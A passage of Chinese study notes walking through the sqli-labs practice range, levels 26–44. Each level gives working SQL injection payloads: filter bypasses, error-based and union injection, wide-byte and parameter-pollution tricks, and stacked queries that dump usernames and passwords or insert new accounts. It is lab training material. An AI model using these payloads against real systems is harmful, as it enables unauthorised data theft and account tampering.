%0c 新的一页
%0d return 功能
%a0 空格
~~~

基本上把所有可替代空格的都过滤了。但是空格的作用还可以用括号代替。

在windows和kali里面用不了，可能因为apache解析不了。只能用()绕过，报错注入空格使用比较少所以可用报错注入

![Less-26-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-01.PNG)



再测一下闭合和回显位 【一个比较不常用的注释符`;%00`】

~~~ shell
?id=1'anandd'1'='1         回显正常
?id=1';%00                 回显正常
?id=1';%00--+              报错
闭合是单引号

----------------------------
?id=1'union(select(1));%00                     报错
?id=1'union(select(1),(2));%00                 报错
?id=1'union(select(1),(2),(3));%00             回显正常
回显位是3

~~~

所以这题用括号代替空格+报错注入



爆表

~~~ shell
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0
~~~

![Less-26-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-02.PNG)



爆字段

~~~ shell
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0
~~~

![Less-26-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-03.PNG)



爆账号密码

~~~ shell
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0
~~~

![Less-26-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-04.PNG)





### level26a

这关和上一关有两个区别：

1、不会爆出具体错误，用不了报错注入

2、闭合是')



![Less-26a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-01.PNG)

和上一关不同，不显示具体报错，导致无法报错注入

![Less-26a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-02.PNG)

那就回归联合注入，闭合是单引号+括号`')'`



爆表

~~~ shell
?id=1') ||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))|| ('0'='0
~~~

![Less-26a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-03.PNG)

所幸sql语句正确和错误的时候网页回显是不同的，这关可以用布尔盲注。 

具体代码先不写了，我不会。。。容后再写



### level27

第二十七关和第二十六关差不多，但二十七关没有过滤<code>and</code>和<code>or</code>而是过滤了<code>select</code>和<code>union</code>，可用大小写绕过和重写绕过

![b1854f3aae1a4e58bb19fe9b5ef3966c](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/b1854f3aae1a4e58bb19fe9b5ef3966c.png)



![Less-27-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-01.PNG)



+ 爆数据表

~~~ shell
?id=1' or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or ' 0
~~~

![Less-27-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-02.PNG)



+ 爆字段

~~~ shell
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema='security'and(table_name='users')))),1))or'0
~~~

![Less-27-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-03.PNG)



+ 爆数据

~~~ shell
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or'0
~~~

![Less-27-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-04.PNG)



### level27a

该关双引号且页面不显示报错信息，过滤规则和二十七关一样，所以需要盲注和联合注入

![Less-27a](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a.PNG)



+ 爆表

~~~ shell
? id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'%0Aand"1
~~~

![Less-27a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-01.PNG)



+ 爆列

~~~ shell
?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"1
~~~

![Less-27a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-02.PNG)



+ 爆账号密码

~~~ shell
?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(password,id,username)from%0Ausers%0Awhere%0Aid=3%0Aand"1
~~~

![Less-27a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-03.PNG)





### Less28

这关过滤的是union select这个整体，源码如下：

~~~ php
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
~~~

注释绕过参考23关，空格用%0a绕过，union select绕过也很简单直接将这个整体双写即可。需要注意的是这里没有报错提示。



输入：

~~~ php
?id=2%27)%0aand%0a1=1;%00
~~~

![Less-28-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-01.png)



继续输入:

~~~ txt
?id=2%27)%0aand%0a1=2;%00
~~~

![Less-28-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-02.png)



输入:

~~~ txt
?id=2%27)%0aorder%0aby%0a3;%00
~~~

![Less-28-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-03.png)



输入：

~~~ txt
?id=2%27)%0aorder%0aby%0a4;%00
~~~

![Less-28-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-04.png)



输入：

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
~~~

![Less-28-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-05.png)



继续输入:

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,database();%00
~~~

![Less-28-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-06.png)



继续输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security');%00
~~~

![Less-28-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-07.png)



继续输入:

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0aand%0atable_name='users');%00
~~~

![Less-28-08](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-08.png)



输入：

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(username,password)%0afrom%0ausers);%00
~~~

![Less-28-09](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-09.png)



其中’**%27**’可以被url解码为‘ **单引号**，而**%0a**被解码为**换行符**，而%00则被url解码为 **ASCII 值为0的字符**，即 **NUL（空字符）**



### Less-28a

~~~  txt
?id=2%27)%0aand%0a1=1;%00
~~~

![Less-28a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-01.png)



继续输入

~~~ txt
?id=2%27)%0aand%0a1=2;%00
~~~

![Less-28a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-02.png)



输入

~~~ txt
?id=2%27)%0aorder%0aby%0a3;%00
~~~

![Less-28a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-03.png)



继续输入

~~~ txt
?id=2%27)%0aorder%0aby%0a4;%00
~~~

![Less-28a-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-04.png)



输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
~~~

![Less-28a-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-05.png)

>  这关主要是过滤“union select”这段字符串



继续输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,database();%00
~~~

![Less-28a-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-06.png)



输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security');%00
~~~

![Less-28a-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-07.png)



继续输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0aand%0atable_name='users');%00
~~~

![Less-28a-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-08.png)



输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(username,password)%0afrom%0ausers);%00
~~~

![Less-28a-09](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-09.png)

其中’**%27**’可以被url解码为‘ **单引号**，而**%0a**被解码为**换行符**，而%00则被url解码为 **ASCII 值为0的字符**，即 **NUL（空字符）**



### Less-29

二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。sql语句在接受相同参数时候接受的是后面的参数值。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/62a1679ce426d6884788a2ac7c418a37.png)

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/1a58d68dcdb85292609ec54be53708ce.png)

所以用注入语句

~~~ cmd
?id=1&id=-1'--+
~~~



~~~ cmd
?id=1&id=-1%27%20union%20select%201,2,3--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-01.png)



~~~ cmd
?id=1&id=-1%27%20union%20select%201,version(),database()--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-02.png)



~~~ cmd
?id=1&id=-1%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-03.png)



~~~ cmd
?id=1&id=-1%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-04.png)



~~~ cmd
?id=1&id=-1%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![](./img/Less-29-05.png)



### Less-30

用注入语句，但是将单引号换成双引号

~~~ cmd
?id=1&id=0" --+
~~~



~~~ cmd
?id=1&id=0" union select 1,2,3--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-01.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,version(),database()--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-02.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-03.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-04.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![](.\img\Less-30-05.png)



### Less-31

和三十关差不多，多了一个括号，用注入指令

~~~ cmd
?id=1&id=-2")--+
~~~



~~~ cmd
?id=1&id=-2")%20union%20select%201,2,3--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-01.png)



~~~ cmd
?id=1&id=-2")%20union%20select%201,database(),version()--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-02.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-03.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-04.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![](.\img\Less-31-05.png)



### Less-32

> 使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id=1"会变成id=1\ ",使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。当某字符的大小为一个字节时，称其字符为窄字节；而当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/56fab10e6769de000c045c580c36749f.png)

~~~ cmd
?id=1%df%27 --+
~~~



sqli-lib-32 宽字节注入

> mysql默认是GBK编码，GBK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字。那么，两个字节就是宽字节，一个字节就是窄字节



漏洞出现原因

> mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码

~~~ php
# 当 我们进行 SQL注入时，会进行一下操作
    
    （1）?id=1' and 1=1%23
    	# 这是正常的语句，我们不放使用SQL语句看一下
    	select * from user where id='1' and 1=1#'
    	
    	# 当php使用函数对接受的参数做了处理后，将单引号转义，在单引号前面加上了 转义符“\"
    	在sql中的语句是：
    	select * from user where id='1\' and 1=1#'
    	# 这时代入数据库查看,这是明显没有注入成功的，因为前面的单引号没有闭合
  
  
    (2) 当我们代入了 %df 时，在数据库中就变成了
    	?id=1%DF' and 1=1%23
    	这时，转义函数，还会对我们输入的单引号进行转义，转义成（\'）,而"\"的url编码为 %5C
    	在url中就变成了：%DF%5c%27
    	当编码为bgk时，%5c会和前面的%df拼合，形成一个汉字（運）
    	从而闭合掉了后面的引号，查询成功
    	
    	最后的sql语句是：
    	select * from user where id='1運' and 1=1#'
~~~



~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-32-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-32-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-32-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-03.png)

> 其中，0x7365637572697479是users的十六进制编码



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-32-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-04.png)



注释：url注释字符编码对照表

![Less-32-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-05.png)

![Less-32-06](.\img\Less-32-06.png)



### Less-33

第三十二关和三十三关一模一样

~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-33-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),version()--+
~~~

![Less-33-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-33-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-03.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-33-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-04.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-33-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-05.png)



### Less-34

这关是POST请求，post型相比于get型少了url编码，这里采用一种新方法，可使用三个字节的汉字将反斜杠消耗



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉#
~~~

![Less-34-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-01.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉'#
~~~

![Less-34-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-02.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' order by 2#
~~~

![Less-34-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-03.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' order by 3#
~~~

![Less-34-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-04.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select 1,2#
~~~

![Less-34-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-05.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),database()#
~~~

![Less-34-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-06.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(table_name) from information_schema.tables where table_schema = database()#
~~~

![Less-34-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-07.png)





~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(column_name) from information_schema.columns where table_name = 0x7573657273#
~~~

![Less-34-08](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-08.png)



~~~ cmd
passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(username,password) from users#
~~~

![Less-34-09](.\img\Less-34-09.png)



### Less-35

使用`addslashes`函数对于输入的内容进行转义，但是id参数没有引号，主要影响在于后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了



首先

~~~ cmd
?id=-1%20union%20select%201,2,3--+
~~~

![Less-35-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-04.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-35-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-01.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-35-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-02.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(username,password),3%20from%20users--+
~~~

![Less-35-03](.\img\Less-35-03.png)



### Less-36

查看后端代码发现使用了mysql_real_escape_string函数对输入的字符进行过滤：

~~~ php
    $string= mysql_real_escape_string($string);    
~~~

可以尝试宽字节注入



~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-36-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),version()--+
~~~

![Less-36-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name) from information_schema.tables where table_schema = database()--+
~~~

![Less-36-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-03.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%20=0x7573657273--+
~~~

![Less-36-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-04.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-36-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-05.png)



### Less-37

三十七关是post提交，使用mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入就行。可使用三个字节的汉字将反斜杠消耗



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' order by 2--+
~~~

![Less-37-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-03.png)





~~~ cmd
passwd=admin&submit=Submit&uname=1汉' order by 3--+
~~~

![Less-37-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-02.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,2--+
~~~

![Less-37-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-04.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
~~~

![Less-37-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-05.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
~~~

![Less-37-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-06.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(username,password) from users--+
~~~

![Less-37-07](.\img\Less-37-07.png)



### Less-38

这一关其实就是单引号闭合，使用正常单引号闭合就可以进行注入，不过这里可以有另外一种注入就是堆叠注入，因为存在`mysqli_multi_query`函数，该函数支持多条`sql`语句同时进行

~~~ cmd
?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27less38%27,%27hello%27)--+
#向数据表插入自己的账户密码
~~~

![Less-38-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-01.png)

 

~~~ cmd
?id=38
~~~

![Less-38-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-02.png)





~~~ cmd
?id=-1%27%20union%20select%201,2,3--+
~~~

![Less-38-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-03.png)



~~~ cmd
?id=-1%27%20union%20select%201,version(),database()--+
~~~

![Less-38-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-04.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
~~~

![Less-38-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-05.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
~~~

![Less-38-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-06.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(username,password) from users--+
~~~

![Less-38-07](.\img\Less-38-07.png)



### Less-39

`id`参数是整数，正常联合注入就行



~~~ cmd
?id=-1%20union%20select%201,2,3
~~~

![Less-39-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-01.png)



~~~ cmd
?id=-1%20union%20select%201,version(),database()
~~~

![Less-39-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-02.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
~~~

![Less-39-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-03.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='users'
~~~

![Less-39-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-04.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(username,password)%20from%20users
~~~

![Less-39-05](.\img\Less-39-05.png)



### Less-40

四十关id参数是单引号加括号闭合，然后使用联合注入就可以了



~~~ cmd
?id=-1%27)%20union%20select%201,2,3--+
~~~

![Less-40-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-01.png)



~~~~ cmd
?id=-1%27)%20union%20select%201,database(),version()--+
~~~~

![Less-40-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-02.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-40-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-03.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"--+
~~~

![Less-40-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-04.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-40-05](.\img\Less-40-05.png)



### Less-41

~~~ cmd
?id=-1%20union%20select%201,2,3
~~~

![Less-41-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-01.png)



~~~ cmd
?id=-1%20union%20select%201,version(),database()
~~~

![Less-41-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-02.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
~~~

![Less-41-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-03.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"
~~~

![Less-41-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-04.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(username,password)%20from%20users
~~~

![Less-41-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-05.png)



### Less-42

因为账户进行了转义处理但密码没有做处理且数据库没有使用`gbk`编码所以不能使用宽字节注入，但是存在堆叠注入函数，所以我们可以在密码那里使用堆叠注入从而向数据库插入密码账号，这样我们再来使用其进行登录就很简单了。

![Less42_02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less42_02.PNG)

~~~ cmd
login_user=1&login_password=1';insert into users(id,username,password) values ('39','Less42','111111')--+&mysubmit=Login
~~~



后面使用已经插入的账号密码进行登录即可

![Less42_03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less42_03.PNG)

![Less42_04](.\img\Less42_04.PNG)



### Less-43

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/85b4c20914c2cbca85bf4d622c609388.png)

四十三关和四十二关差不多但是密码参数是单引号和括号闭合的。

![Less43-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-01.PNG)

![Less43-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-02.PNG)

~~~ cmd
login_user=1&login_password=1');insert into users(id,username,password) values ('41','Less43','111111')--+&mysubmit=Login
~~~



后面使用已经插入的账号密码进行登录即可

![Less43-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-03.PNG)

![Less-43-04](.\img\Less-43-04.PNG)



### Less-44

四十四关和四十二关一样，所以直接向数据库插入数据

![Less-44-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-01.png)

![Less-44-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-02.png)

~~~ cmd
